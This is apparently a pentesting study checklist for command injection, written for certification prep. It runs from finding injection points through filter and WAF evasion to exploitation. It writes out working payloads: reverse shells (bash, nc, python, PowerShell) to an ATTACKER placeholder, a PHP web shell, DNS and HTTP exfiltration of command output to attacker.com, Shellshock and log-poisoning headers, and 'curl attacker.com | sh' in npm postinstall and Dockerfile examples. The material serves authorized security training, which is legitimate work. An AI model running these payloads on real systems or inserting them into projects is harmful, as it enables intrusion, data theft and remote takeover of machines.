---
title: "⭐ Checklist Command Injection"
category: ["PREP_CPTS", "Pen-testing", "Command Injections", "⭐ Checklist Command injection"]
---

## Phase 1: Detection and Confirmation

### 1.1 Identify Potential Entry Points

- [ ] Forms that execute system commands (`ping`, `nslookup`, `touch`, document conversion, PDF generation, backups)
    
- [ ] GET/POST parameters passed to functions like `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()` (PHP) or `child_process.exec/spawn` (NodeJS)
    
- [ ] Fields expecting a specific format (IP, hostname, filename, path)
    
- [ ] HTTP headers (`User-Agent`, `X-Forwarded-For`, `Referer`, `Cookie`)
    
- [ ] Administrative functionalities: backup, restore, export, network diagnostics
    
- [ ] Parameters that end up in system commands: `convert`, `ffmpeg`, `tar`, `zip`, `nmap`
    

### 1.2 Test Basic Injection Operators

|Operator|Character|URL-Encoded|Behavior|
|---|---|---|---|
|Semicolon|`;`|`%3b`|Both commands (not in CMD, yes in PowerShell)|
|New Line|`\n`|`%0a`|Both|
|Background|`&`|`%26`|Both (output of the second usually appears first)|
|Pipe|`\|`|`%7c`|Only output of the second|
|AND|`&&`|`%26%26`|Second only if the first succeeds|
|OR|`\|`|`%7c%7c`|Second only if the first fails|
|Sub-Shell|` `` `|`%60%60`|Linux only|
|Sub-Shell|`$()`|`%24%28%29`|Linux only|

**Test payload:** `127.0.0.1; whoami` → `ping -c 1 127.0.0.1; whoami`

> 💡 **Improvement:** If the first command fails (e.g., `|| whoami` without IP), the output is cleaner and avoids noise in the response. Useful when the output is truncated or the WAF blocks `;` but not `||`.

### 1.3 Confirm Vulnerability

- [ ] Verify that the output of the injected command appears in the response
    
- [ ] If there is front-end validation (error without network request), **bypass with Burp Suite / ZAP** by intercepting and modifying the request directly
    
- [ ] Verify in `Firefox DevTools` (Ctrl+Shift+E) if a network request is generated when sending the payload
    
- [ ] Test with payloads that generate **delay** (`sleep 5`, `timeout /t 5`) to confirm blind execution
    
- [ ] Test with **DNS callback** (Burp Collaborator, `interactsh`) to confirm blind execution with exfiltration
    

---

## 🛡️ Phase 2: Identify Active Filters

### 2.1 Detect What Is Blocked

- [ ] Send reduced payload **character by character** to identify the exact block
    
- [ ] Differentiate the source of the error:
    
    - Error in the output field → **application filter (PHP)**
        
    - Error page/WAF with request info → **WAF**
        
- [ ] Test with `wafw00f` to identify the WAF
    
- [ ] Check HTTP response code (403, 406, 501 → WAF; 200 with "invalid input" → app)
    
- [ ] Check the `Server` header and `X-Powered-By` to identify technology
    

### 2.2 Bypass Checklist by Filter Type

#### 🔹 Space Filter

- [ ] Tab `%09`
    
- [ ] Variable `$IFS` / `${IFS}`
    
- [ ] Brace expansion: `{ls,-la}`
    
- [ ] Redirection: `cat</etc/passwd`
    
- [ ] `$IFS$9` (avoids concatenation with the next character)
    
- [ ] `${IFS:0:1}` (only the first character of IFS)
    
- [ ] `%0a` (newline as separator)
    

#### 🔹 Slash `/` or Backslash `\` Filter

- [ ] Linux environment variables: `${PATH:0:1}` (→ `/`), `${LS_COLORS:10:1}` (→ `;`), `${PWD:0:1}`
    
- [ ] Windows variables: `%HOMEPATH:~6,-11%` (CMD), `$env:HOMEPATH[0]` (PowerShell)
    
- [ ] **Character shifting** with `tr`: `echo $(tr '!-}' '"-~'<<<[)` (→ `\`)
    
- [ ] Enumerate with `printenv` / `Get-ChildItem Env:` to find useful variables
    
- [ ] `cd` + wildcard: `cat etc/passwd` (without `/`) from the root
    

#### 🔹 Command Filter (Blacklist)

- [ ] Quote insertion: `w'h'o'am'i` / `w"h"o"am"i` (pairs, do not mix)
    
- [ ] Linux: `who$@ami`, `w\ho\am\i`
    
- [ ] Windows: `who^ami`
    
- [ ] Variables: `a=who; b=ami; $a$b`
    
- [ ] Concatenation: `who""ami`, `who''ami`
    
- [ ] Absolute path: `/usr/bin/whoami` (avoids word blacklist)
    
- [ ] Wildcards: `/usr/bin/who*`, `/usr/bin/*ami`
    
- [ ] Regex: `/usr/bin/who?mi`, `/usr/bin/who[a]mi`
    

#### 🔹 Advanced Bypasses (WAF)

- [ ] **Uppercase/lowercase**: `WhOaMi` (Windows), `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` (Linux)
    
- [ ] **Reversed commands**: `$(rev<<<'imaohw')` / PowerShell: `iex "$('imaohw'[-1..-20] -join '')"`
    
- [ ] **Base64 encoded commands**: `bash<<<$(base64 -d<<<Y2F0...==)` / PowerShell: `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('...')))"`
    
- [ ] **Alternative Base64**: `openssl enc -d -base64` if `base64` is blocked
    
- [ ] **Hex**: `xxd -r -p` to decode hexadecimal
    
- [ ] **Automated tools**:
    
    - Linux: **Bashfuscator** (`./bashfuscator -c 'cmd' -s 1 -t 1 --no-mangling --layers 1`)
        
    - Windows: **DOSfuscation** (`Invoke-DOSfuscation` → `SET COMMAND ...` → `encoding`)
        
    - **Commix** (`commix --url="http://target/?ip=127.0.0.1" --os-cmd=whoami`)
        

#### 🔹 Specific WAF Bypasses

- [ ] Double URL encoding: `%2527` for `'`
    
- [ ] Unicode: `\u0027` for `'`
    
- [ ] Null byte: `%00`
    
- [ ] Fragmentation: `who` + `ami` in different parameters
    
- [ ] HTTP Parameter Pollution (HPP): `?ip=127.0.0.1&ip=;whoami`
    
- [ ] Change Content-Type or method (POST vs GET)
    
- [ ]  Chunked transfer encoding
    
- [ ] Case switching in headers (`User-Agent`, `X-Forwarded-For`)
    

---

## 🚀 Phase 3: Exploitation and Post-Exploitation

### 3.1 Context Verification

- [ ] Identify server OS (`uname -a` / `ver` / `systeminfo`)
    
- [ ] Identify user (`whoami` / `id` / `whoami /priv`)
    
- [ ] Verify shell (bash, sh, zsh, CMD, PowerShell)
    
- [ ] Verify network restrictions (`curl`, `wget`, `nc` available)
    

### 3.2 Information Gathering

- [ ] `cat /etc/passwd` or `type C:\Windows\System32\drivers\etc\hosts`
    
- [ ] Environment variables (`env` / `set`)
    
- [ ] Processes (`ps aux` / `tasklist`)
    
- [ ] Network connections (`netstat -tulpn` / `netstat -ano`)
    
- [ ] Sensitive files, credentials, configurations
    
- [ ] Command history (`~/.bash_history` / `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`)
    
- [ ] Application configuration files (`config.php`, `.env`, `web.config`)
    

### 3.3 Establish Interactive Access (Reverse Shell)

- [ ] **Linux (bash)**: `bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`
    
- [ ] **Linux (nc)**: `nc -e /bin/sh ATTACKER PORT` or `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f`
    
- [ ] **Linux (python)**: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
    
- [ ] **Windows (PowerShell)**: `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);..."`
    
- [ ] **Windows (nc.exe)**: Upload `nc.exe` and execute reverse shell
    
- [ ] **MSFvenom / msfconsole**: Generate specific payloads (`msfvenom -p linux/x64/shell_reverse_tcp LHOST=... LPORT=... -f elf`)
    
- [ ] **Constrained shells**: If no bash/nc, use `socat`, `perl`, `ruby`, `php`, `lua`
    
- [ ] **Web shell**: Write shell in web directory (`echo '<?php system($_GET["c"]); ?>' > /var/www/html/shell.php`)
    

### 3.4 Privilege Escalation

- [ ] SUID/GUID enumeration (`find / -perm -4000 2>/dev/null`)
    
- [ ] Cron jobs, services, file permissions
    
- [ ] `sudo -l`, `uname -a` for kernel exploits
    
- [ ] Windows: `whoami /priv`, `SeImpersonatePrivilege`, `winPEAS`, `PowerUp`
    
- [ ] GTFOBins for SUID or sudo binaries
    
- [ ] Check `capabilities` (`getcap -r / 2>/dev/null`)
    
- [ ] Credentials in configuration files
    

---

## 🌿 Advanced Branches of Command Injection

### 🔸 1. Blind Command Injection

#### Time-based

- [ ] `sleep 5`, `timeout /t 5`, `ping -c 10 127.0.0.1`
    
- [ ] Measure response time to confirm execution
    
- [ ] `sleep$(echo 5)` to obfuscate
    
- [ ] `ping -c 5 127.0.0.1` (natural delay)
    
- [ ] **Note:** useful when there is no visible output but the command executes
    

#### Out-of-band (OOB) — DNS Exfiltration

- [ ] `nslookup $(whoami).attacker.com`
    
- [ ] `dig $(whoami).attacker.com`
    
- [ ] `curl http://attacker.com/$(whoami)`
    
- [ ]   `ping -c 1 $(whoami).attacker.com`
    
- [ ] **Tools:** Burp Collaborator, `interactsh`, `DNSBin`
    
- [ ] **Windows:** `nslookup %USERNAME%.attacker.com`
    
- [ ] **Filter bypasses:** `nslookup%09$(whoami).attacker.com`
    

#### Redirection to Web-Accessible File

- [ ] `whoami > /var/www/html/output.txt`
    
- [ ] `whoami > /tmp/out.txt; cat /tmp/out.txt` (if output is not visible)
    
- [ ] Verify at `http://target/output.txt`
    

### 🔸 2. Injection in HTTP Headers

Note title: Untitled

- [ ] `User-Agent`, `X-Forwarded-For`, `Referer`, `Cookie`, `X-Real-IP`
    
- [ ] Test with `;`, `|`, `$()`, `` ` ``
    
- [ ] Tools: `commix`, Burp Intruder
    
- [ ] **Example:** `User-Agent: () { :; }; /bin/bash -c 'whoami'` (Shellshock in CGI)
    
- [ ] **Example:** `X-Forwarded-For: 127.0.0.1; whoami`
    

### 🔸 3. Injection in specific tool arguments

- [ ] **ImageMagick** (`convert` → CVE-2016-3714, "ImageTragick"): `convert 'https://attacker.com/exploit.jpg' out.png`
    
- [ ] **ffmpeg**: SSRF + file read via HLS
    
- [ ] **tar**: `tar -cf out.tar --checkpoint-action=exec=sh shell.sh`
    
- [ ] **git**: `git clone --upload-pack='cmd'`
    
- [ ] **zip**: `zip -T -TT 'cmd' out.zip`
    
- [ ] **nmap**: `nmap --script=...` if arguments are controlled
    
- [ ] **ping/nslookup**: injectable arguments (`-c 1 ; whoami`)
    

### 🔸 4. Shell expression injection

- [ ] **Variable expansion**: `${PATH}`, `${IFS}`, `${LS_COLORS}`, `${PWD}`
    
- [ ] **Command substitution**: `$(...)`, `` `...` ``, `$()`
    
- [ ] **Process substitution**: `>(cmd)`, `<(cmd)`
    
- [ ] **Wildcards**: `cat /etc/pass*`, `/*/bin/*`, `cat /etc/passw?`
    
- [ ] **Regex**: `cat /etc/pass[w]d`
    
- [ ] **Brace expansion**: `{cat,/etc/passwd}`, `{ls,-la}`
    
- [ ] **Globbing**: `cat /???/passwd` (3 chars per `?`)
    
- [ ] **History**: `!!`, `!$` (if interactive history exists)
    
- [ ] **Tilde**: `~`, `~/`, `~user/`
    

### 🔸 5. Injection in specific environments

#### PHP

- [ ] Vulnerable functions: `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`, `pcntl_exec`
    
- [ ] **Bypass disable_functions:** `LD_PRELOAD`, `imap_open` (CVE-2018-19518), `mail()`, `putenv`
    
- [ ] `backticks` in PHP: `` `whoami` ``
    

#### NodeJS

- [ ] `child_process.exec`, `child_process.spawn`, `child_process.execSync`
    
- [ ] **Prototype pollution** → RCE
    

#### Python

- [ ] `os.system`, `os.popen`, `subprocess.call`, `subprocess.Popen`, `subprocess.run`
    
- [ ] `eval`, `exec` (code injection, not OS cmd)
    

#### Java

- [ ] `Runtime.getRuntime().exec()`, `ProcessBuilder`
    
- [ ] **Deserialization** → RCE (ysoserial)
    

#### Ruby

- [ ] `system`, `exec`, `` `...` ``, `%x{}`, `IO.popen`, `Open3`
    

#### .NET

- [ ] `Process.Start`, `System.Diagnostics.Process`
    
- [ ]  **ViewState** deserialization → RCE
    

### 🔸 6. Injection in Cloud/Container environments

- [ ] **Docker**: commands in `ENTRYPOINT`/`CMD`, container escape
    
- [ ] **Kubernetes**: `kubectl exec`, service account tokens, pod escape
    
- [ ] **Serverless**: AWS Lambda (event injection), Azure Functions
    
- [ ] **CI/CD**: pipeline injection (GitHub Actions, GitLab CI)
    
- [ ] **Webhooks**: URL validation, SSRF to RCE
    

### 🔸 7. Database injection → RCE

- [ ] **MySQL**: `SELECT ... INTO OUTFILE '/var/www/html/shell.php'`
    
- [ ] **MSSQL**: `xp_cmdshell`, `sp_OACreate`, `sp_OAMethod`
    
- [ ] **PostgreSQL**: `COPY ... TO PROGRAM 'cmd'`, `pg_read_file`
    
- [ ] **Oracle**: `DBMS_SCHEDULER`, `UTL_FILE`, `DBMS_XSLPROCESSOR`
    
- [ ] **SQLmap**: `--os-cmd=whoami`, `--os-shell`
    

### 🔸 8. Log injection → RCE

- [ ] Log poisoning: inject PHP code in `User-Agent`, `Referer` → include log via LFI
    
- [ ] **Example:** `User-Agent: <?php system($_GET['c']); ?>` + `?page=/var/log/apache2/access.log`
    
- [ ] `/proc/self/environ`, `/proc/self/cmdline`
    

### 🔸 9. Compiler/script argument injection

- [ ] **Impacket** (`psexec.py`, `smbexec.py`)
    
- [ ] **Ansible** (`--extra-vars`)
    
- [ ]  **Modifiable cron jobs**
    
- [ ] **Modifiable systemd units**
    

### 🔸 10. Third-party tool injection

- [ ] **Git hooks**: `pre-commit`, `post-checkout`
    
- [ ] **NPM postinstall**: `"postinstall": "curl attacker.com | sh"`
    
- [ ] **Composer scripts**: `"post-install-cmd"`
    
- [ ]**Makefile**: `$(shell cmd)`
    
- [ ]   **Dockerfile**: `RUN curl attacker.com | sh`
    

---

## 🧰 Automation Tools

|Tool|OS|Usage|
|---|---|---|
|**Commix**|Multi|`commix --url="http://target/?ip=127.0.0.1" --os-cmd=whoami`|
|**Bashfuscator**|Linux|`./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1`|
|**DOSfuscation**|Windows|`Invoke-DOSfuscation` interactive|
|**SQLmap**|Multi|`--os-cmd`, `--os-shell` (with SQLi)|
|**Metasploit**|Multi|`exploit/multi/http/...` modules|
|**Nuclei**|Multi|Command injection templates|
|**wafw00f**|Multi|WAF detection|
|**interactsh / Burp Collaborator**|Multi|OOB DNS/HTTP|
|**GTFOBins**|Linux|Privilege escalation with allowed binaries|
|**LOLBAS**|Windows|Native binaries for bypass|

---

## ✅ Quick Field Checklist (summary)

[ ] 1. Identify input → command execution
[ ] 2. Test basic operators (;, |, &&, ||, \n, $())
[ ] 3. Bypass front-end validation with Burp/ZAP
[ ] 4. Identify filtered characters/commands (char by char)
[ ] 5. Bypass spaces (tab, $IFS, {})
[ ] 6. Bypass / and \ (env vars, shifting)
[ ] 7. Bypass command blacklists (quotes, ^, \, $@)
[ ] 8. Advanced bypass (case, reverse, base64, tools)
[ ] 9. Confirm execution (whoami, id, uname -a)
[ ] 10. Verify context (OS, user, shell, network)
[ ] 11. Collect info (passwd, env, processes, files)
[ ] 12. Reverse shell (bash, nc, python, powershell, web shell)
[ ] 13. Post-exploitation (SUID, cron, sudo, credentials)
[ ] 14. Privilege escalation
[ ] 15. If blind: time-based / OOB DNS